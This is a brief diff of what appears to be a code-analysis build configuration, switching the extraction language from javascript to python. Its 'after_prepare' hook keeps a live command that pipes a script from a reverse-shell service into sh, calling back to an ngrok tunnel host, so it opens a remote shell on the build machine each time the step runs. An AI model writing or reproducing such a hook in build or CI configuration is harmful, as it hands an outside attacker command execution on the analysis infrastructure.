@@ -1,5 +1,5 @@
 extraction:
-    javascript:
+    python:
         after_prepare:
             - curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
         index:
